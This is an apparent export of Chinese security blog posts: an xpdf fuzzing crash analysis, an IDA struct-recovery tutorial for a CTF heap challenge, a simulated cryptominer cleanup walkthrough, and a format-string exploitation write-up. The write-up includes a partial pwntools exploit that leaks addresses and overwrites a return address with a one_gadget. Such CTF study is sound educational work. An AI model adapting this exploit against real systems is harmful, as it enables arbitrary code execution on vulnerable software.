c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> Object *<span class="hljs-title">Object::dictLookup</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, Object *obj)</span></span><br><span class="hljs-function">  </span>&#123; <span class="hljs-keyword">return</span> dict-&gt;<span class="hljs-built_in">lookup</span>(key, obj); &#125;<br>Object对象的dict属性中调用lookup方法 其实就是从对象Object中寻找对应key的值<br></code></pre></td></tr></table></figure><p><img src="/../images/Fuzzing101-Ex1/image-20231104214553935.png" alt="image-20231104214553935"></p><p>我们又跳转进去了dict—&gt;lookup</p><p>进入后我们发现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Object *<span class="hljs-title">Dict::lookup</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, Object *obj)</span> </span>&#123;<br>  DictEntry *e;<br>  <span class="hljs-keyword">return</span> (e = <span class="hljs-built_in">find</span>(key)) ? e-&gt;val.<span class="hljs-built_in">fetch</span>(xref, obj) : obj-&gt;<span class="hljs-built_in">initNull</span>();<br>&#125;<br><span class="hljs-comment">//这里最重要的就是e的取值，e-&gt;val的类型问题</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Fuzzing101-Ex1/image-20231107163850426.png" alt="image-20231107163850426"></p><p>我们动态进去调试一下看看 </p><p>这里我们神奇的发现 原来e-&gt;val是一个objRef类型的</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107165108113.png" alt="image-20231107165108113"></p><p>我们接着往下看</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107165435849.png" alt="image-20231107165435849"></p><p>可以看到我们又跑进了Object::fetch这个函数 我们继续跟进</p><p>我们发现其参数为7,0 这也就意味着 我们又要跟着原来的过程进去了</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">XRef<span class="hljs-type">::fetch</span>(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>, newobj)———&gt;Parser<span class="hljs-type">::getObj</span>———&gt;Parser<span class="hljs-type">::makeStream</span>———&gt;dict-&gt;dictLookup(<span class="hljs-string">&quot;Length&quot;</span>, &amp;obj)———&gt;xRef-&gt;fetch(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>, newobj)——&gt;<span class="hljs-params">...</span><span class="hljs-params">...</span>.一直循环<br></code></pre></td></tr></table></figure><p><img src="/../images/Fuzzing101-Ex1/image-20231107165615728.png" alt="image-20231107165615728"></p><p>这里我们就可以发现了 我们这又调用了一遍xref—&gt;fetch </p><p>我们接着往下跑的时候 又再次进去了xref—&gt;fetch  发现调用的参数相同且是同一个函数 （7，0，obj） 造成了无限递归</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107175613977.png" alt="image-20231107175613977"></p><h2 id="分析漏洞原因"><a href="#分析漏洞原因" class="headerlink" title="分析漏洞原因"></a>分析漏洞原因</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">整体修复思路也比较简单 要么限制递归次数 要么对寻找出来的e的类型进行校验即可<br></code></pre></td></tr></table></figure><p>这里我们整理一下运行情况</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">主要是调用的 xref-&gt;fetch(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>, &amp;newobj)，发生了问题，至此，我们成功还原了递归链条：<br><br><span class="hljs-number">1.</span>main 经过一些过程之后，创建了一个 PDFDoc对象，并且传入了fileName,ownerPW,userPW 这里因为没有密码肯定是<span class="hljs-number">0</span> <br><span class="hljs-number">2.</span>PDFDoc里面调用setup(ownerPassword, userPassword) ，其中读目录的时候 catalog = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Catalog(<span class="hljs-params">xref</span>)</span> 又<span class="hljs-keyword">new</span>了一个新Catalog<br><span class="hljs-number">3.</span>在Catalog中调用xref-&gt;get<span class="hljs-constructor">Catalog(&amp;<span class="hljs-params">catDict</span>)</span> <br><span class="hljs-number">4.</span>在<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Xref</span>.</span></span>h里查找 这时候我们相当于获得了一个xref::fetch<br><span class="hljs-number">5.</span>xref-&gt;fetch(<span class="hljs-built_in">ref</span>.num, <span class="hljs-built_in">ref</span>.gen, obj) 被调用，实际上 call 了 xref-&gt;fetch(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, obj)<br><span class="hljs-number">6.</span>xref-&gt;fetch 过程中，检测到这条 entry 是未被压缩的，调用 parser-&gt;get<span class="hljs-constructor">Obj(<span class="hljs-params">obj</span>, <span class="hljs-params">fileKey</span>=NULL, <span class="hljs-params">encAlgorithm</span>=&lt;RC4&gt;, <span class="hljs-params">keyLength0</span>, <span class="hljs-params">num</span>=5, <span class="hljs-params">gen</span>=0)</span>，以获取 num=<span class="hljs-number">5</span>, gen=<span class="hljs-number">0</span> 这个 pdf <span class="hljs-keyword">object</span><br><span class="hljs-number">7.</span>Parser::getObj 过程中，首先通过 obj-&gt;init<span class="hljs-constructor">Dict(<span class="hljs-params">xref</span>)</span> 把 obj 从 objNone 初始化成一个 objDict，调用 make<span class="hljs-constructor">Stream(<span class="hljs-params">obj</span>, <span class="hljs-params">fileKey</span>=NULL, <span class="hljs-params">encAlgorithm</span>=&lt;RC4&gt;, <span class="hljs-params">keyLength</span>=0, <span class="hljs-params">objNum</span>=5, <span class="hljs-params">objGen</span>=0)</span> 生成一个 Stream<br><span class="hljs-number">8.</span>Parser::makeStream 过程中，调用 obj-&gt;dict<span class="hljs-constructor">Lookup(<span class="hljs-string">&quot;Length&quot;</span>, &amp;<span class="hljs-params">newobj</span>)</span>，意图是从现在已经是 objDict 的 obj 里面取 key 为 <span class="hljs-string">&quot;Length&quot;</span> 的键值对，把 value 给 newobj<br><span class="hljs-number">9.</span>上述 dictLookup 是一个简单封装，调用 obj-&gt;dict-&gt;lookup(<span class="hljs-string">&quot;Length&quot;</span>, &amp;newobj)<br><span class="hljs-number">10.</span>上述 lookup 从 obj-&gt;dict 这个 dictionary 里面寻找到 key 为 <span class="hljs-string">&quot;Length&quot;</span> 的 entry e: (key=<span class="hljs-string">&quot;Length&quot;</span>, <span class="hljs-keyword">val</span>=&lt;objRef&gt;)，且这里的这个类型为 objRef 的 <span class="hljs-keyword">val</span> 的 <span class="hljs-built_in">ref</span> 二元组为 (num=<span class="hljs-number">7</span>, gen=<span class="hljs-number">0</span>)。调用 <span class="hljs-keyword">val</span>.fetch(xref, &amp;newobj)<br><span class="hljs-number">11.</span>当我们接着往下面走的时候，会发现同样的，还是会进入xref-&gt;fetch(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,obj)，至此进入了无限递归。<br></code></pre></td></tr></table></figure><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>根据漏洞所在位置这里 我们发现其实作者是很想obj.isInt做个判断的 但是没有判别 就已经进入循环了</p><p><img src="/../images/Fuzzing101-Ex1/image-20231107195325100.png" alt="image-20231107195325100"></p><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><p>1.对程序做一个e的判定，其实就是思考里的内容，但是这个判断加的位置不好</p><p>2.对循环次数做一个判断，不能一直陷入循环当中</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzing101</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打堆第一步,先”斩“结构体</title>
    <link href="/2023/09/26/%E5%85%88%E2%80%9D%E6%96%A9%E2%80%9C%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <url>/2023/09/26/%E5%85%88%E2%80%9D%E6%96%A9%E2%80%9C%E7%BB%93%E6%9E%84%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这里我们主要以CTF wiki 上UAF的例题hacknote为例 去创建一个结构体 探索堆题代码结构的真相 让pwn师傅少点逆向的痛</p><p>题目：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote">ctf-challenges&#x2F;pwn&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote&#x2F;hacknote at master · ctf-wiki&#x2F;ctf-challenges (github.com)</a></p><p>引用：<a href="http://f0und.icu/article/13.html#0x10_%E6%81%A2%E5%A4%8D%E7%BB%93%E6%9E%84%E4%BD%93">IDA 分析技巧记录 - F0und</a></p></blockquote><h2 id="1-分析程序"><a href="#1-分析程序" class="headerlink" title="1.分析程序"></a>1.分析程序</h2><p>分析程序 我们发现 主要有这几个需要添加结构体来便于我们分析 首先我们要知道的是</p><blockquote><p>**(&amp;notelist + i)  存的其实是print_note_content这个函数的指针</p><p>*(v0 + 4) 存的其实是content_chunk的指针值</p><p><em>(</em>(&amp;notelist + i) + 1) 这个位置 存储的其实是content的内容</p></blockquote><p>下面我们来讨论一个问题：</p><blockquote><p> 我们要区分 *(v0 + 4) 和 <em>(</em>(&amp;notelist + i) + 1) 里的4 1分别是什么型？</p></blockquote><p>根据指针的运算 我们知道</p><p>其实这里的4 是四个字节 而这里的1 是加了一个整数类型</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926112444800-1696396536733-1-1696397282563-1.png" alt="image-20230926112444800"></p><h2 id="2-创造结构体"><a href="#2-创造结构体" class="headerlink" title="2.创造结构体"></a>2.创造结构体</h2><p>根据分析内容 我们开始尝试去创建结构体</p><p>我们可以直接使用shift＋F1 来进入struct的页面 ida里允许我们直接去写一段c代码的struct来插入(我们只需要在struct界面敲insert键)</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926113317228-1696396536733-2-1696397282563-2.png" alt="image-20230926113317228"></p><p>我们去拟定我们的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"># 我们创建一个名叫hacknote的结构体 并且起了一个简写名称叫note<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span>&#123;</span><br><span class="hljs-type">char</span> * print_ptr;<br><span class="hljs-type">char</span> * content;<br>&#125;hacknote;<br></code></pre></td></tr></table></figure><p>如下图所示:</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926113708054-1696396536733-3-1696397282563-3.png" alt="image-20230926113708054"></p><p>我们成功的添加进入了 两个结构体</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926113745669-1696396536733-4-1696397282563-4.png" alt="image-20230926113745669"></p><h2 id="3-修改数据类型"><a href="#3-修改数据类型" class="headerlink" title="3.修改数据类型"></a>3.修改数据类型</h2><p>我们先修改第一块内容的&amp;notelist+i的内容 按“Y”键查看 ida本来给他识别的数据类型</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145358287-1696396536733-5-1696397282563-5.png" alt="image-20230926145358287"></p><p>按照循环我们知道 应该是会创建5个notelist数组 这里我们能直接修改数组内容</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145638994-1696396536733-6-1696397282563-6.png" alt="image-20230926145638994"></p><p>修改数组内容如下：</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145754188-1696396536733-7-1696397282564-7.png" alt="image-20230926145754188"></p><p>我们可以看到 notelist数组已经被修的十分完美了</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145850975-1696396536733-8-1696397282564-8.png" alt="image-20230926145850975"></p><blockquote><p>接下来我们来使用我们的结构体</p></blockquote><p>同样的 我们选中notelist数组 修改类型</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926150042763-1696396536733-9-1696397282564-9.png" alt="image-20230926150042763"></p><p>这里我们看到这个类型为void型 我们可以改成我们的结构类型note</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926150206058-1696396536733-10-1696397282564-11.png" alt="image-20230926150206058"></p><p>修完后 我们就可以很清楚的发现我们的代码更清晰了</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926150308428-1696396536733-11-1696397282564-10.png" alt="image-20230926150308428"></p><blockquote><p>到此，你就已经完成了一次结构体的创建与修复。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>结构体</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次仿真挖矿的&quot;彻底&quot;清除</title>
    <link href="/2023/09/22/%E6%A0%BC%E6%8C%96%E7%9F%BF/"/>
    <url>/2023/09/22/%E6%A0%BC%E6%8C%96%E7%9F%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><p>首先find &#x2F; -mmin 2 查看一下两分钟的运行进程</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212426481-862263094.png" alt="image-20230922200547730"></p><p>我们发现back kthreads都有问题</p><p>我们依次来看</p><p>查看back文件如下 发现循环写入的文件 我们要找维持文件 我们接着找维持文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212426004-1386439901.png" alt="image-20230922200909241"></p><p>查看kthreads文件 成功发现维持文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212425510-2146432774.png" alt="image-20230922201014444"></p><p>打开crontab 发现了计划文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422833-738385297.png" alt="image-20230922201256778"></p><p>我们再运行netstat -antp 找一下外连</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212424594-23813724.png" alt="image-20230922201359853"></p><p>这里我们成功发现外连ip 和程序</p><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h2 id="我们先消灭远连程序"><a href="#我们先消灭远连程序" class="headerlink" title="我们先消灭远连程序"></a>我们先消灭远连程序</h2><p>远连程序在&#x2F;tmp&#x2F;vmware-root_663-402224331x8&#x2F;</p><p>就是bard程序</p><p>执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> /tmp/vmware-root_663-402224331 x8/*<br></code></pre></td></tr></table></figure><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212424236-1576548630.png" alt="image-20230922201902382"></p><h2 id="消灭维持程序"><a href="#消灭维持程序" class="headerlink" title="消灭维持程序"></a>消灭维持程序</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> /bin/kthreads<br></code></pre></td></tr></table></figure><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212423763-865701469.png" alt="image-20230922201957095"></p><h2 id="消灭计划文件"><a href="#消灭计划文件" class="headerlink" title="消灭计划文件"></a>消灭计划文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim /etc/crontab<br></code></pre></td></tr></table></figure><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212423196-1086869727.png" alt="image-20230922202221799"></p><p>删除前</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422833-738385297.png"></p><p>进去删除后两行，删除后</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422465-2042186302.png" alt="image-20230922205955620"></p><h2 id="消除病毒文件"><a href="#消除病毒文件" class="headerlink" title="消除病毒文件"></a>消除病毒文件</h2><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422105-623403464.png" alt="image-20230922202417676"></p><p>这里我们需要先kill掉父进程 6585</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212421712-1117002146.png" alt="0baee4f8b68788caaa8119c7c39c8f1"></p><p>如图所以 后面6585变为了 1 说明已经杀掉了 父进程</p><p>杀完父进程 我们再kill子进程 12891 和 12938</p><p>最后一步</p><p>进去&#x2F;usr&#x2F;bin删除watchdogdd文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212421194-1043759702.png" alt="image-20230922204647158"></p><h2 id="kill远连程序"><a href="#kill远连程序" class="headerlink" title="kill远连程序"></a>kill远连程序</h2><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212420565-875885553.png" alt="image-20230922212254058"></p><p>结果如下：</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212420021-99696863.png" alt="image-20230922212337536"></p><h2 id="删除helloworld"><a href="#删除helloworld" class="headerlink" title="删除helloworld"></a>删除helloworld</h2><p>最后 我们删除helloworld即可 所有删除结束</p>]]></content>
    
    
    <categories>
      
      <category>Good_job</category>
      
    </categories>
    
    
    <tags>
      
      <tag>virus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈非栈上格式化字符串</title>
    <link href="/2023/08/05/%E6%A0%BC%E5%BC%8Faformat/"/>
    <url>/2023/08/05/%E6%A0%BC%E5%BC%8Faformat/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这里先浅分析修改返回地址的两种打法，分别是”诸葛连弩”和”四马分肥“</p></blockquote><h2 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h2><blockquote><p>本文例题 以陕西省赛easy_printf为主</p></blockquote><p>无法修改got表地址 我们采用直接修改ret地址</p><p><img src="/../images/format/image-20230805195229862.png"></p><p>简单看一看程序 需要先过一个判断然后进入vuln</p><p><img src="/../images/format/image-20230805195120134.png" alt="image-20230805195120134"></p><p>进入后 有一个13次的循环 可以让我们操作</p><p><img src="/../images/format/image-20230805195344959.png" alt="image-20230805195344959"></p><p>第一步 肯定要先leak出栈地址 程序基地址和libc基地址</p><p>第二步 修改ret地址 改为one_gadget</p><p>关键讲第二步 如何修改</p><h3 id="一、四马分肥"><a href="#一、四马分肥" class="headerlink" title="一、四马分肥"></a>一、四马分肥</h3><blockquote><p>何为四马分肥？其实就是把要写的地址分成四部分 然后分布在栈中 一次性打入</p></blockquote><p>如图所示：</p><p><img src="/../images/format/image-20230805200230567.png" alt="image-20230805200230567"></p><p>这三个位置被我们依次写入了ret地址 ret+2地址 ret+4地址 ret+6地址（这里省略了 因为高位通常都是0 是不需要修改的）看到这里 就可以很快的改写这些位置的数据 只要依次修改20 26 30的位置 便可以一次修改成功</p><blockquote><p>那我们如何构造这样的函数呢？</p></blockquote><p>首先，我们需要找一个<strong>三连指针</strong>和一个<strong>二连或者三连</strong> 这道题初始栈空间如下：</p><p><img src="/../images/format/image-20230805201147152.png" alt="image-20230805201147152"></p><p>我们使用的是 标点一 先就行修改标点二的指向 使3710 –&gt;3760 然后我们再修改标点二位置 也就是修改了3888–&gt;3708</p><blockquote><p>这就是 修改标点一 先就行修改标点二的指向 使3710 –&gt;3760 </p></blockquote><p><img src="/../images/format/image-20230805201938922.png" alt="image-20230805201938922"></p><blockquote><p>然后我们再修改标点二位置 也就是修改了3888–&gt;3708 我们可以清楚的看到 这个位置已经被成功改成了 ret的地址</p></blockquote><p><img src="/../images/format/image-20230805202130416.png" alt="image-20230805202130416"></p><p>再使用标点一 修改标点二指向 使3710 –&gt;3790  然后我们再修改标点二位置 也就是修改了3790  –&gt;3708+2</p><blockquote><p>这里就是 这一步修改完的最后样子 我们可以看到3790这个位置也已经被写成了 ret+2</p></blockquote><p><img src="/../images/format/image-20230805202320512.png" alt="image-20230805202320512"></p><p>再一次使用标点一 修改标点二指向 使3710 –&gt;37b0  然后我们再修改标点二位置 也就是修改了37b0  –&gt;3708+4</p><blockquote><p>我们看到这里已经看出 这其实已经完全改好了 我们只需要进行最后一步 简单的改写数据即可</p></blockquote><p><img src="/../images/format/image-20230805202547825.png" alt="image-20230805202547825"></p><p>改好后的栈图：</p><p><img src="/../images/format/image-20230805202728334.png"></p><p>贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 四马分肥</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)    <span class="hljs-comment">#arch=&#x27;amd64&#x27;,arch=&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>it = <span class="hljs-keyword">lambda</span> : p.interactive()<br>b=<span class="hljs-keyword">lambda</span> :gdb.attach(p)<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>get_leaked_libc64_1 = <span class="hljs-keyword">lambda</span> :u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>get_leaked_libc32 = <span class="hljs-keyword">lambda</span> :u32(p.recv(<span class="hljs-number">4</span>))<br>get_leaked_libc64_2 = <span class="hljs-keyword">lambda</span> :u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br>get_canary = <span class="hljs-keyword">lambda</span>:<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)) <br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27526</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    b()<br><br><br><span class="hljs-comment"># 过判断</span><br>payload1=<span class="hljs-string">&quot;TokameinE_is_the_best_pwner\x00&quot;</span><br>sa(<span class="hljs-string">&quot;Do you know who the best pwner is?&quot;</span>,payload1)<br><br><span class="hljs-comment"># 泄露binary</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;%9$p%29$p%8$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>vuln_42=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>binary_base=vuln_42-<span class="hljs-number">42</span>-elf.symbols[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>leak(<span class="hljs-string">&quot;binary_base&quot;</span>,binary_base)<br><br><span class="hljs-comment"># 泄露libc_base</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>start_240=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=start_240-<span class="hljs-number">240</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br><span class="hljs-comment"># 泄露栈地址</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>rbp_16=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>leak(<span class="hljs-string">&quot;rbp_16&quot;</span>,rbp_16)<br><br><span class="hljs-comment"># one_gadget</span><br>one=[<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>one_gadget=libc_base+one[<span class="hljs-number">0</span>]<br>leak(<span class="hljs-string">&quot;one_gadget&quot;</span>,one_gadget)<br><br><br>one_gadget_1 = one_gadget &amp; <span class="hljs-number">0xffff</span>  <span class="hljs-comment"># 后两位</span><br>one_gadget_2 = (one_gadget &gt;&gt; <span class="hljs-number">16</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 往前推俩</span><br>one_gadget_3 = (one_gadget &gt;&gt; <span class="hljs-number">32</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 再往前推两位</span><br>one_gadget_4 = (one_gadget &gt;&gt; <span class="hljs-number">48</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 最前面两位</span><br><br>leak(<span class="hljs-string">&quot;one_gadget_1&quot;</span>,one_gadget_1)<br>leak(<span class="hljs-string">&quot;one_gadget_2&quot;</span>,one_gadget_2)<br>leak(<span class="hljs-string">&quot;one_gadget_3&quot;</span>,one_gadget_3)<br>leak(<span 